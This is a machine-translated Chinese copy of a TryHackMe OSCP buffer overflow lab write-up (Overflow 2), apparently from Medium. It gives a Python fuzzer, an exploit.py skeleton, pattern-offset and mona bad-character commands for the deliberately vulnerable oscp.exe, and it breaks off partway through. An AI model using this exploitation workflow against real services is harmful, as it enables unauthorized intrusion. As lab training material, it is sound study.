<html>
<head>
<title>TryHackMe: OSCP Buffer Overflow Prep (OVERFLOW 2)</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">TryHackMe: OSCP缓冲区溢出准备(溢出2)</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/tryhackme-oscp-buffer-overflow-prep-overflow-2-57c22b51a91f?source=collection_archive---------2-----------------------#2021-04-13">https://infosecwriteups.com/tryhackme-oscp-buffer-overflow-prep-overflow-2-57c22b51a91f?source=collection_archive---------2-----------------------#2021-04-13</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="1c17" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">由Shamsher khan练习的基于堆栈的缓冲区溢出！对于OSCP </strong></p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi kl"><img src="../Images/0324a5155f413ded5931dc98553d0f85.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*h_36jvvkmUopuevD4uOzKw.png"/></div></div></figure><p id="25e5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">房间链接:</strong><a class="ae kx" href="https://www.tryhackme.com/room/bufferoverflowprep" rel="noopener ugc nofollow" target="_blank"><strong class="jp ir">https://www.tryhackme.com/room/bufferoverflowprep</strong></a><strong class="jp ir"><br/>注:此房免费</strong></p><p id="6382" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在你完成这篇文章之前，确保你已经完成了</p><h2 id="a900" class="ky kz iq bd la lb lc dn ld le lf dp lg jy lh li lj kc lk ll lm kg ln lo lp lq bi translated"><a class="ae kx" href="https://shamsher-khan-404.medium.com/tryhackme-oscp-buffer-overflow-prep-overflow-1-19e000482f27" rel="noopener">缓冲区溢出准备(溢出-1) </a></h2><p id="1a4b" class="pw-post-body-paragraph jn jo iq jp b jq lr js jt ju ls jw jx jy lt ka kb kc lu ke kf kg lv ki kj kk ij bi translated"><a class="ae kx" href="https://github.com/shamsherkhan852/Buffer-Overflow-Vulnerable-app" rel="noopener ugc nofollow" target="_blank"> <strong class="jp ir">下载OSCP.exe</strong></a></p><div class="lw lx gp gr ly lz"><a href="https://github.com/shamsherkhan852/Buffer-Overflow-Vulnerable-app" rel="noopener  ugc nofollow" target="_blank"><div class="ma ab fo"><div class="mb ab mc cl cj md"><h2 class="bd ir gy z fp me fr fs mf fu fw ip bi translated">shamsherkhan 852/缓冲区溢出漏洞app</h2><div class="mg l"><h3 class="bd b gy z fp me fr fs mf fu fw dk translated">此时您不能执行该操作。您已使用另一个标签页或窗口登录。您已在另一个选项卡中注销，或者…</h3></div><div class="mh l"><p class="bd b dl z fp me fr fs mf fu fw dk translated">github.com</p></div></div><div class="mi l"><div class="mj l mk ml mm mi mn kv lz"/></div></div></a></div><h1 id="b046" class="mo kz iq bd la mp mq mr ld ms mt mu lg mv mw mx lj my mz na lm nb nc nd lp ne bi translated">定义:</h1><ol class=""><li id="e3fc" class="nf ng iq jp b jq lr ju ls jy nh kc ni kg nj kk nk nl nm nn bi translated"><strong class="jp ir"> EIP = &gt; </strong>扩展指令指针(EIP)是一个寄存器，包含程序或命令的下一条指令的地址。</li><li id="8d0b" class="nf ng iq jp b jq no ju np jy nq kc nr kg ns kk nk nl nm nn bi translated"><strong class="jp ir"> ESP= &gt; </strong>扩展堆栈指针(ESP)是一个寄存器，它让你知道你在堆栈上的位置，并允许你将数据推入和推出应用程序。</li><li id="0b7d" class="nf ng iq jp b jq no ju np jy nq kc nr kg ns kk nk nl nm nn bi translated"><strong class="jp ir"> JMP = &gt; </strong>跳转(JMP)是一条修改执行流程的指令，其中您指定的操作数将包含要跳转到的地址。</li><li id="f50b" class="nf ng iq jp b jq no ju np jy nq kc nr kg ns kk nk nl nm nn bi translated"><strong class="jp ir"> \x41，\x42，\ x43 =&gt;</strong>A、B、c的十六进制值，对于这个练习来说，使用hex vs ascii并没有什么好处，这只是我个人的喜好。</li></ol><h1 id="5549" class="mo kz iq bd la mp mq mr ld ms mt mu lg mv mw mx lj my mz na lm nb nc nd lp ne bi translated">溢出#2</h1><p id="4f91" class="pw-post-body-paragraph jn jo iq jp b jq lr js jt ju ls jw jx jy lt ka kb kc lu ke kf kg lv ki kj kk ij bi translated">好的，现在我们应该以管理员身份运行我们的免疫调试器并打开oscp.exe。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi nt"><img src="../Images/7a463f27a85ef9c7525c0fdfab7cdab2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1306/format:webp/0*0iW0jtwmJM2Gp7Il.png"/></div></figure><p id="c45a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">应用程序将以“暂停”状态加载到调试器中。在抗干扰调试器中点击上栏<strong class="jp ir">或F9 </strong>上的红色播放按钮。</p><p id="065c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">通过检查免疫力调试器右下角的状态，确保exe正在运行。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi nu"><img src="../Images/1e69de03adce86494c33fc47bebe7cf9.png" data-original-src="https://miro.medium.com/v2/resize:fit:620/format:webp/0*2SxWY62OW5CRwVv1.png"/></div></div></figure><p id="b05c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">要进行检查，我们可以使用端口1337 NC到目标机器。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi nv"><img src="../Images/e9d05723403d7a8e1a110236fd17a3ad.png" data-original-src="https://miro.medium.com/v2/resize:fit:1022/format:webp/1*xLHmVsrT0nlVBcUCqbdTtw.png"/></div></figure><p id="1c72" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在这里我选择<strong class="jp ir">溢出2 </strong>参数</p><p id="99a7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在mona中设置工作文件夹。</p><div class="lw lx gp gr ly lz"><a href="https://github.com/corelan/mona" rel="noopener  ugc nofollow" target="_blank"><div class="ma ab fo"><div class="mb ab mc cl cj md"><h2 class="bd ir gy z fp me fr fs mf fu fw ip bi translated">科勒兰/莫娜</h2><div class="mg l"><h3 class="bd b gy z fp me fr fs mf fu fw dk translated">是一个python脚本，可以用来自动化和加速特定的搜索…</h3></div><div class="mh l"><p class="bd b dl z fp me fr fs mf fu fw dk translated">github.com</p></div></div><div class="mi l"><div class="nw l mk ml mm mi mn kv lz"/></div></div></a></div><p id="94c0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">将mona.py和paset下载到C:\ Program Files(x86)\ Immunity Inc \ Immunity Debugger \ py commands</p><pre class="km kn ko kp gt nx ny nz oa aw ob bi"><span id="48b4" class="ky kz iq ny b gy oc od l oe of">!mona config -set workingfolder c:\mona\%p</span></pre><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi og"><img src="../Images/8f8180076c829ada23b73b0ad71d8bea.png" data-original-src="https://miro.medium.com/v2/resize:fit:838/format:webp/0*P5IlxS276wuRw-mM.png"/></div></figure><p id="06b5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">让我们试着运行fuzzer.py(从房间获取)看看结果。只需检查脚本中的IP是否正确，并确保在运行脚本之前再次运行免疫调试器中的oscp.exe。</p><p id="9b37" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">注意:-将fuzzer.py和exploit.py中的OVERFLOW1命令改为overflow 2</strong></p><h1 id="55de" class="mo kz iq bd la mp mq mr ld ms mt mu lg mv mw mx lj my mz na lm nb nc nd lp ne bi translated">Fuzzer.py</h1><pre class="km kn ko kp gt nx ny nz oa aw ob bi"><span id="5d85" class="ky kz iq ny b gy oc od l oe of">import socket, time, sys<br/>ip = "192.168.43.57";<br/>port = 1337<br/>timeout = 5<br/>buffer = []<br/>counter = 100<br/>while len(buffer) &lt; 30:<br/>    buffer.append("A" * counter)<br/>    counter += 100<br/>for string in buffer:<br/>    try:<br/>        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br/>        s.settimeout(timeout)<br/>        connect = s.connect((ip, port))<br/>        s.recv(1024)<br/>        print("Fuzzing with %s bytes" % len(string))<br/>        s.send("OVERFLOW2 " + string + "\r\n")<br/>        s.recv(1024)<br/>        s.close()<br/>    except:<br/>        print("Could not connect to " + ip + ":" + str(port))<br/>        sys.exit(0)<br/>    time.sleep(1)</span></pre><p id="f350" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">同时复制<strong class="jp ir"> exploit.py </strong>代码</p><pre class="km kn ko kp gt nx ny nz oa aw ob bi"><span id="5b85" class="ky kz iq ny b gy oc od l oe of">import socket</span><span id="1d05" class="ky kz iq ny b gy oh od l oe of">ip = "192.168.43.57"<br/>port = 1337</span><span id="129f" class="ky kz iq ny b gy oh od l oe of">prefix = "OVERFLOW2 "<br/>offset = 0<br/>overflow = "A" * offset<br/>retn = ""<br/>padding = ""<br/>payload = ""<br/>postfix = ""</span><span id="3652" class="ky kz iq ny b gy oh od l oe of">buffer = prefix + overflow + retn + padding + payload + postfix</span><span id="bc6b" class="ky kz iq ny b gy oh od l oe of">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><span id="1eae" class="ky kz iq ny b gy oh od l oe of">try:<br/>  s.connect((ip, port))<br/>  print("Sending evil buffer...")<br/>  s.send(bytes(buffer + "\r\n", "latin-1"))<br/>  print("Done!")<br/>except:<br/>  print("Could not connect.")</span></pre><p id="17cf" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">点击红色的播放按钮，并开始对目标IP fuzzer . py</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi oi"><img src="../Images/09a8de8dd89e571a6b45c03af626570c.png" data-original-src="https://miro.medium.com/v2/resize:fit:854/format:webp/1*utsR6zEEq-wquucxwr392w.png"/></div></figure><p id="6232" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果你能看到它停在700字节，这意味着偏移量将在600到700字节的范围内。让我们创建一个大于300字节的模式，也就是1000字节。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi oj"><img src="../Images/c701a62384541f9afc35e46486daa3a0.png" data-original-src="https://miro.medium.com/v2/resize:fit:1348/format:webp/1*MJlJyyGBkow-OlJr-4Jt8w.png"/></div></figure><p id="4a77" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">上图中你可以看到EIP已经被41414141 (AAAA)覆盖。所以我们需要找到程序崩溃的确切地址</p><p id="2b0e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在根据使服务器崩溃的字节长度生成一个模式。</p><pre class="km kn ko kp gt nx ny nz oa aw ob bi"><span id="df03" class="ky kz iq ny b gy oc od l oe of">msf-pattern_create -l 1000</span></pre><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi ok"><img src="../Images/78218d4c786b3939ee7a81b4d44009c8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*56qNsaVEfTan5Ti5N2Nd9Q.png"/></div></div></figure><p id="c8d3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以复制有效载荷，放入exploit.py中的有效载荷变量，尝试运行。该脚本应该会再次使oscp.exe服务器崩溃。</p><p id="8246" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"> CTRL+F2 =重新加载OSCP.exe</strong></p><p id="13b9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"> F9 =运行服务器</strong></p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi ol"><img src="../Images/3b348705d659eba97d54df40c0ba22b9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*3eZKCvADO8RRlQQsprp3Ew.png"/></div></div></figure><p id="c7f6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">确保oscp.exe正在免疫调试器中运行。对目标执行exploit.py。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi om"><img src="../Images/fb3de66565d4f67000da9270b3e6947d.png" data-original-src="https://miro.medium.com/v2/resize:fit:812/format:webp/0*CJ7Okh9M1KBOqIbI.png"/></div></figure><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi on"><img src="../Images/c618cfa7cc927733bfbb2746ff8d797f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1342/format:webp/1*Zf9KBpvxdeUuOZQy0HYI-A.png"/></div></figure><p id="695d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在上图中，我们有<strong class="jp ir"> EIP=76413176 </strong></p><p id="413f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">EIP被我们生成的偏移量覆盖。</p><h1 id="eac6" class="mo kz iq bd la mp mq mr ld ms mt mu lg mv mw mx lj my mz na lm nb nc nd lp ne bi translated">查找偏移值</h1><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi og"><img src="../Images/fe4291eab2e2464493c78b41b5c1b425.png" data-original-src="https://miro.medium.com/v2/resize:fit:838/format:webp/1*9O3v6--J7AvWSTYB4HxJUg.png"/></div></figure><p id="78ca" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">偏移值是634</p><p id="510f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">使用mona模块查找偏移值的另一种方法</strong></p><p id="0860" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">尝试在免疫模式下运行以下mona命令:</p><pre class="km kn ko kp gt nx ny nz oa aw ob bi"><span id="11dd" class="ky kz iq ny b gy oc od l oe of">!mona findmsp -distance 1000</span></pre><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi oo"><img src="../Images/8d5c1cdd2fcc17683f5876113faaf6f1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1124/format:webp/1*oo701tj9z9ylUyE1MR3omQ.png"/></div></figure><p id="a676" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以寻找表示EIP包含正常模式的行:0x76413176(偏移量634)。我们在offset变量中找到的偏移量，并将retn变量设置为BBBB。</p><p id="fe25" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">更新偏移量和retn变量</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi op"><img src="../Images/1a297bb7a1a84a488f18efa0b02a2c0a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*hcCj1nwgY-DrnoCyu6_Yiw.png"/></div></div></figure><p id="63ef" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">重新启动。exe，并按Ctrl+F12和F9运行。执行exploit.py。如果偏移量正确，我们应该看到“42424242”</p><p id="9e17" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">Let’s run it again.</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi om"><img src="../Images/fb3de66565d4f67000da9270b3e6947d.png" data-original-src="https://miro.medium.com/v2/resize:fit:812/format:webp/0*CJ7Okh9M1KBOqIbI.png"/></div></figure><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi oq"><img src="../Images/68349d57facba876a7c96034bbfd87c8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1344/format:webp/1*a6CQLIWW-6MGEAtgAADAkA.png"/></div></figure><p id="2eb3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">As we can see the <strong class="jp ir">EIP</strong>寄存器被BBBB或42424242覆盖。到目前为止，一切都很顺利。</p><p id="c482" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">记下ESP地址，因为我们将在后续步骤中使用该位置的值</p><h1 id="f42c" class="mo kz iq bd la mp mq mr ld ms mt mu lg mv mw mx lj my mz na lm nb nc nd lp ne bi translated">查找Badchars</h1><p id="be4b" class="pw-post-body-paragraph jn jo iq jp b jq lr js jt ju ls jw jx jy lt ka kb kc lu ke kf kg lv ki kj kk ij bi translated">现在我们需要找到bad char——为此我们创建bad char，使用MONA在机器内部设置，另一个只需通过谷歌搜索或使用python脚本。默认情况下\x00被认为是一个坏字符，所以它肯定会被忽略。这有助于我们识别对我们的程序真正有害的字符！</p><p id="7f9d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">使用mona生成bytearray，默认情况下排除空字节(\x00)。</p><p id="6fb5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">使用这个mona命令。</p><pre class="km kn ko kp gt nx ny nz oa aw ob bi"><span id="18c0" class="ky kz iq ny b gy oc od l oe of">!mona bytearray -b "\x00"</span></pre><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi or"><img src="../Images/ec9b349f7ba800938d06da71936f39d6.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*zyc8vKDrEhCO6XVR.png"/></div></div></figure><p id="5f54" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在我们需要从\x01到\xff生成一个与bytearray相同的坏字符字符串。使用python脚本</p><h1 id="ff24" class="mo kz iq bd la mp mq mr ld ms mt mu lg mv mw mx lj my mz na lm nb nc nd lp ne bi translated">bytegen.py</h1><pre class="km kn ko kp gt nx ny nz oa aw ob bi"><span id="fd78" class="ky kz iq ny b gy oc od l oe of">for x in range(1, 256):<br/>  print("\\x" + "{:02x}".format(x), end='')<br/>print()</span></pre><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi os"><img src="../Images/8e14f9a95a9582b27f2b9aec208e9ba0.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*oFmeuohY78e2m0Y_.png"/></div></div></figure><p id="eba2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这个生成的字符串已经删除了\x00，所以我们需要从。和莫娜在一起。</p><p id="07e9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">将新生成的字符串复制到exploit.py中的有效负载变量中</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi ol"><img src="../Images/8624464df1e3cf78c8d99a0846c9218d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*m2iM3GPGGmxy6_3Rup2BFw.png"/></div></div></figure><p id="8422" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">运行脚本并记下ESP寄存器指向的地址</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi om"><img src="../Images/fb3de66565d4f67000da9270b3e6947d.png" data-original-src="https://miro.medium.com/v2/resize:fit:812/format:webp/0*CJ7Okh9M1KBOqIbI.png"/></div></figure><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi ot"><img src="../Images/f2acaed5a3d956f64cc09f955fed2d09.png" data-original-src="https://miro.medium.com/v2/resize:fit:1338/format:webp/1*h73jdui7YYWPn2a1_QRr4A.png"/></div></figure><p id="a236" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">右键单击ESP值，然后转储</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi ou"><img src="../Images/98defca388bd8f2a1c91261b1551ac63.png" data-original-src="https://miro.medium.com/v2/resize:fit:788/format:webp/1*Tdq3RiUx7eY7YGhViAUTUg.png"/></div></figure><p id="63f4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在上面的图像中，序列在22或25之间被改变，这意味着在有效载荷中有一些坏字符，让我们找出坏字符</p><p id="9b0b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在下面的mona命令中使用它</p><p id="ab59" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">注意:- </strong>也许您的ESP地址不同</p><pre class="km kn ko kp gt nx ny nz oa aw ob bi"><span id="bd8e" class="ky kz iq ny b gy oc od l oe of">!mona compare -f C:\mona\oscp\bytearray.bin -a 00DAFA28</span></pre><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi ov"><img src="../Images/04842b3c063f88714f888ed1043911d3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*W5vjZvbXUMlJkhpbAuSrhw.png"/></div></div></figure><p id="3ab4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">可能的错误字符</p><p id="ca33" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以我们找到了一个可能的坏字符列表<code class="fe ow ox oy ny b"><strong class="jp ir">23 24 3c 3d 83 84 ba bb</strong></code></p><p id="60b1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">并非所有这些都是不好的字符！有时坏字符也会导致下一个字节损坏，甚至影响字符串的其余部分。</p><p id="6c6c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">此时，我开始一次删除一个不良字符。我通过重复以下步骤，一次删除一个坏字符:</p><ul class=""><li id="0853" class="nf ng iq jp b jq jr ju jv jy oz kc pa kg pb kk pc nl nm nn bi translated">从字节数组中删除字符</li><li id="da07" class="nf ng iq jp b jq no ju np jy nq kc nr kg ns kk pc nl nm nn bi translated">从漏洞有效载荷中移除字符</li><li id="011e" class="nf ng iq jp b jq no ju np jy nq kc nr kg ns kk pc nl nm nn bi translated">启动exe</li><li id="2996" class="nf ng iq jp b jq no ju np jy nq kc nr kg ns kk pc nl nm nn bi translated">使用mona进行比较</li></ul><p id="9547" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">开始豁免oscp.exe，</p><p id="fc8c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以我创建了一个新的bytearray，并从有效负载中删除了\x23</p><pre class="km kn ko kp gt nx ny nz oa aw ob bi"><span id="8b7b" class="ky kz iq ny b gy oc od l oe of">!mona bytearray -b "\x00\x23"</span></pre><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi pd"><img src="../Images/bd800570486784a363a6dc81a422ced5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1368/format:webp/1*pZtx_sGJV4O6-U7Q6WBh5g.png"/></div></figure><p id="fbed" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">运行服务器</p><p id="4f3a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">编辑exploit.py从有效负载变量中移除\x23并运行exploit.py</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi om"><img src="../Images/fb3de66565d4f67000da9270b3e6947d.png" data-original-src="https://miro.medium.com/v2/resize:fit:812/format:webp/0*CJ7Okh9M1KBOqIbI.png"/></div></figure><p id="b76b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">检查ESP指针值</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi pe"><img src="../Images/1d7c47c58b6ddb246bc2c8236df51e74.png" data-original-src="https://miro.medium.com/v2/resize:fit:1350/format:webp/1*rVBS_J9Nw7Mn6jtXizmEEA.png"/></div></figure><pre class="km kn ko kp gt nx ny nz oa aw ob bi"><span id="a29d" class="ky kz iq ny b gy oc od l oe of">!mona compare -f C:\mona\oscp\bytearray.bin -a 009AFA28(ESP)</span></pre><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi pf"><img src="../Images/7f51010c5d741624d16b04cfb9a9bdb7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1212/format:webp/1*PhgBAahK8-nDmQHSFbt5qg.png"/></div></figure><p id="e836" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">根据免疫调试器的提示，现在可能的坏字符是x3c \x3d \x83 \x84\xba\xbb。这意味着一个BADCHAR把它的相邻字节也变成了BADCHAR，缺省情况下BAD char是不需要的</p><p id="fb2b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">开始豁免oscp.exe</p><p id="1337" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以我创建了一个新的bytearray，并从有效负载中删除了\x3c</p><pre class="km kn ko kp gt nx ny nz oa aw ob bi"><span id="fd1e" class="ky kz iq ny b gy oc od l oe of">!mona bytearray -b "\x00\x23\x3c"</span></pre><p id="76cc" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">运行服务器</p><p id="80bf" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">编辑exploit.py从有效负载变量中移除\x3c并运行exploit.py</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi om"><img src="../Images/fb3de66565d4f67000da9270b3e6947d.png" data-original-src="https://miro.medium.com/v2/resize:fit:812/format:webp/0*CJ7Okh9M1KBOqIbI.png"/></div></figure><p id="4661" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">检查ESP指针值</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi pe"><img src="../Images/aecd1d7d28cdd1d63f0ecb067163ffb1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1350/format:webp/1*LWD6IbvRN2uXQ8rjvswXgg.png"/></div></figure><pre class="km kn ko kp gt nx ny nz oa aw ob bi"><span id="4f4d" class="ky kz iq ny b gy oc od l oe of">!mona compare -f C:\mona\oscp\bytearray.bin -a 0077FA28</span></pre><figure class="km kn ko kp gt kq gh gi paragraph-image"><div 